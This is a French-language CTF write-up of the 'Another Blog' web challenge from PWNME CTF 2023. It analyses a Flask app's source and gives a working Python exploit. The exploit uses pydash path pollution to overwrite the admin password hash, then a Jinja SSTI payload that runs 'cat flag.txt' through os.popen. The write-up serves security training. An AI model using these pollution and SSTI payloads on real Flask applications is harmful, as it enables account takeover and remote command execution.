---
title: "Another Blog | PWNME CTF 2023"
date: 2023-05-06T12:00:00Z
description: "Voici un writeup complet du quatrième challenge web du pwnme ctf"
tags: ["flask", "injection","ssti","python"]
keywords: ["flask", "injection","ssti","python"]
---
[//]: <> (Wrote By Vozec 06/05/2023)
---

# Introduction du challenge:

```
Objective: Read the flag, situated on the server in /app/flag.txt
```

# Tree Viewer

Les sources de ce challenge sont fournies :
```bash
.
├── app.py
├── articles.py
├── config.yaml
├── docker-compose.yml
├── Dockerfile
├── flag.txt
├── input.css
├── package.json
├── package-lock.json
├── requirements.txt
├── static
│   └── style.css
├── tailwind.config.js
├── templates
│   ├── article.html
│   ├── articles.html
│   ├── banner.html
│   ├── head.html
│   ├── home.html
│   ├── login.html
│   └── register.html
└── users.py
```

On a ici 3 fichiers intéressants :
- *users.py*
- *articles.py*
- *app.py*

L'application est un serveur flask:
```python
from re import template
from flask import Flask, render_template, render_template_string, request, redirect, session, sessions
from users import Users
from articles import Articles


users = Users()
articles  = Articles()
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'


@app.context_processor
def inject_user():
    return dict(session=session)

@app.route("/create", methods=["POST"])
def create_article():
    name, content = request.form.get('name'), request.form.get('content')
    if type(name) != str or type(content) != str or len(name) == 0:
        return redirect('/articles')
    articles.set(name, content)
    return redirect('/articles')

@app.route("/remove/<name>")
def remove_article(name):
    articles.remove(name)
    return redirect('/articles')

@app.route("/articles/<name>")
def render_page(name):
    article_content = articles[name]
    if article_content == None:
        pass
    if 'user' in session and users[session['user']['username']]['seeTemplate'] != False:
        article_content = render_template_string(article_content)
    return render_template('article.html', article={'name':name, 'content':article_content})

@app.route("/articles")
def get_all_articles():
    return render_template('articles.html', articles=articles.get_all())

@app.route('/show_template')
def show_template():
    if 'user' in session and users[session['user']['username']]['restricted'] == False:
        if request.args.get('value') == '1':
            users[session['user']['username']]['seeTemplate'] = True
            session['user']['seeTemplate'] = True
        else:
            users[session['user']['username']]['seeTemplate'] = False
            session['user']['seeTemplate'] = False
    return redirect('/articles')


@app.route("/register", methods=["POST", "GET"])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    username, password = request.form.get('username'), request.form.get('password')
    if type(username) != str or type(password) != str:
        return render_template("register.html", error="Wtf are you trying bro ?!")
    result = users.create(username, password)
    if result == 1:
        session['user'] = {'username':username, 'seeTemplate': users[username]['seeTemplate']}
        return redirect("/")
    elif result == 0:
        return render_template("register.html", error="User already registered")
    else:
        return render_template("register.html", error="Error while registering user")


@app.route("/login", methods=["POST", "GET"])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    username, password = request.form.get('username'), request.form.get('password')
    if type(username) != str or type(password) != str:
        return render_template('login.html', error="Wtf are you trying bro ?!")
    if users.login(username, password) == True:
        session['user'] = {'username':username, 'seeTemplate': users[username]['seeTemplate']}
        return redirect("/")
    else:
        return render_template("login.html", error="Error while login user")


@app.route('/logout')
def logout():
    session.pop('user')
    return redirect('/')

@app.route('/')
def index():
    return render_template("home.html")


app.run('0.0.0.0', 5000, debug=True)
```


On a ensuite 2 class:
```python
import pydash

class Articles:

    def __init__(self):
        self.set('welcome', 'Test of new template system: {%block test%}Block test{%endblock%}')

    def set(self, article_name, article_content):
        pydash.set_(self, article_name, article_content)
        return True


    def get(self, article_name):
        if hasattr(self, article_name):
            return (self.__dict__[article_name])
        return None

    def remove(self, article_name):
        if hasattr(self, article_name):
            delattr(self, article_name)

    def get_all(self):
        return self.__dict__

    def __getitem__(self, article_name):
        return self.get(article_name)
```

et  

```python
import hashlib

class Users:

    users = {}

    def __init__(self):
        self.users['admin'] = {'password': None, 'restricted': False, 'seeTemplate':True }

    def create(self, username, password):
        if username in self.users:
            return 0
        self.users[username]= {'password': hashlib.sha256(password.encode()).hexdigest(), 'restricted': True, 'seeTemplate': False}
        return 1

    def login(self, username, password):
        if username in self.users and self.users[username]['password'] == hashlib.sha256(password.encode()).hexdigest():
            return True
        return False

    def seeTemplate(self, username, value):
        if username in self.users and self.users[username].restricted == False:
            self.users[username].seeTemplate = value

    def __getitem__(self, username):
        if username in self.users:
            return self.users[username]
        return None
```

Après une lecture du code, on comprend que :
- un utilisateur a 2 propriétés:
  - restricted *(default=True)*
  - seeTemplate *(default=False)*

- On peut créer des *articles*
  - nom de l'article
  - valeur de l'article

- On peut voir un *article*:
  - avec ``render_template``
  - avec ``render_template_string``


# Vulnérabilité(s):

- La première chose qu'il faut voir est que ``render_template_string`` est vulnérable à une attaque de type *Server-Side-Template-Injection*.  
Nous contrôlons le contenu de ce qui est passé en paramètre de cette fonction (le contenu de l'article) donc si nous arrivons dans ce code : le tour est joué et nous avons notre exécution de commande.

Notre objectif est donc de passer le paramètre ``seeTemplate`` de notre utilisateur à ``True``.

Pour se faire, on se rend qu'il existe un endpoint */show_template* qui permet de modifier cette valeur.

```python
@app.route('/show_template')
def show_template():
    if 'user' in session and users[session['user']['username']]['restricted'] == False:
        if request.args.get('value') == '1':
            users[session['user']['username']]['seeTemplate'] = True
            session['user']['seeTemplate'] = True
        else:
            users[session['user']['username']]['seeTemplate'] = False
            session['user']['seeTemplate'] = False
    return redirect('/articles')
```

Ainsi, si on accède à ``/show_template?value=1``, si nôtre utilisateur a la propriété ``restricted`` à ``False``, la valeur de ``seeTemplate`` sera modifié.

- La seconde Vulnérabilité se trouve dans la class de ``Articles``:
  ```python
  import pydash

  def set(self, article_name, article_content):
      pydash.set_(self, article_name, article_content)
      return True
  ```
  Ce code est utilisé pour ajouter un article en mémoire.  
  Le problème est que le serveur utilise ``pydash`` pour associer à ``article_name`` la valeur ``article_content``.

  On peut ré-écrire cette fonction comme :
  ```python
  def set(self, article_name, article_content):
      self[article_name] = article_content
      return True
  ```

  Vous l'aurez peut-être compris, on peut écrire n'importe qu'elle valeur dans des clés qui sont hors de *Articles*.  
  A la même manière qu'une pyjail ou une ssti, on peut essayer de remonter aux objets de l'application flask pour modifier une propriété de l'utilisateur.

  On peut tester en local *pydash* :
  ```python
  >>> pydash.set_({"A":{"B":"C"}}, "A.B", "D")
  {'A': {'B': 'D'}}
  ```

  On peut modifier la fonction *set* en local pour afficher le contenu de chemin python :  
  ```python
  def set(self, article_name, article_content):
    x = self.__init__.__globals__['__loader__'].__init__.__globals__['sys']
    print(dir(x),x)
    pydash.set_(self, article_name, article_content)
    return True
  ```

  ```bash
  docker-compose build;docker-compose up
  ```
  *Résultats*:  
  ```bash
  ...
    blog_pollution-anozerblog-1  | ['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_framework', '_getframe', '_git', '_home', '_xoptions', 'abiflags', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'get_int_max_str_digits', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'set_int_max_str_digits', 'setcheckinterval', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions']
    <module 'sys' (built-in)>
  blog_pollution-anozerblog-1  |  * Serving Flask app 'app'
  blog_pollution-anozerblog-1  |  * Debug mode: on
  blog_pollution-anozerblog-1  | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
  blog_pollution-anozerblog-1  |  * Running on all addresses (0.0.0.0)
  blog_pollution-anozerblog-1  |  * Running on http://127.0.0.1:5000
  blog_pollution-anozerblog-1  |  * Running on http://172.18.0.2:5000
  blog_pollution-anozerblog-1  | Press CTRL+C to quit
  blog_pollution-anozerblog-1  |  * Restarting with stat
  blog_pollution-anozerblog-1  |  * Debugger is active!
  blog_pollution-anozerblog-1  |  * Debugger PIN: 590-441-492
  ...
  ```

  On accède ici au module *sys*.
  On peut aller encore plus loin est accéder au dictionnaire contenant les utilisateurs :
  ```python
  x = self.__init__.__globals__['__loader__'].__init__.__globals__['sys'].modules['__main__'].users
  ```
  ```bash
  <users.Users object at 0x7f54b78e9640>
  ```

La méthode intended serai de modifier la propriété *restricted* de notre utilisateur pour ensuite activer *seeTemplate* et abusé de la SSTI.

Je vais ici présenter une méthode un petit peu plus rapide.
On remarque qu'un utilisateur ``admin`` est déjà présent:  
```python
class Users:
    users = {}

    def __init__(self):
        self.users['admin'] = {'password': None, 'restricted': False, 'seeTemplate':True }
```

Celui-ci a déjà les bonnes permissions mais nous ne connaissons pas son mot de passe.
Plus loin on lit:  
```python
def login(self, username, password):
        if username in self.users and self.users[username]['password'] == hashlib.sha256(password.encode()).hexdigest():
            return True
        return False
```


Le *login* se fait en hachant les mots de passe en ``sha256``.  
Nous allons donc réécrire le mot de passe de l'utilisateur admin avec un sha256 dont nous connaissons le plaintext.


# POC.

On peut donc écrire une POC proprement :  
```python
import requests
import random
import re
import hashlib

class exploit:
	def __init__(self,url,session):
		self.url = url
		self.sess = session

	def login(self,user,pwd):
		r = self.sess.post('%s/login'%(self.url),data={"username":user,"password":pwd})
		return 'Error while login user' not in r.text

	def register(self):
		self.user = ''.join([random.choice('abcdef') for _ in range(15)])
		self.pwd = self.user
		r = self.sess.post('%s/register'%(self.url),data={"username":self.user,"password":self.pwd})
		return 'Logout' in r.text

	def create_note(self,name,value):
		r = self.sess.post('%s/create'%(self.url),data={"name":name,"content":value})
		return r.text
		return re.findall(r'<a href="articles/(.*?)</a>',r.text)

	def view_note(self,note):
		return self.sess.get('%s/articles/%s'%(self.url,note)).text

exp = exploit(
	url='http://13.37.17.31:50656',
	session=requests.session()
)
exp.register()
exp.login(exp.user,exp.pwd)
exp.create_note(
	name  = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.users.admin.password',
	value = hashlib.sha256(b'vozec').hexdigest()
)
r = exp.login('admin','vozec')
```

Il ne nous reste plus qu'à créer une note avec un SSTI:
```python
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
```

On ajoute à la POC précédente:
```python
exp.create_note(
	name  = 'rce',
	value = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
)
res = exp.view_note(
	note = 'rce'
)
print(res)
```

On obtient le flag : ``PWNME{D3ep_P0l1ut1oN_C4n_b3_D3s7ruCt1vE_5c}``
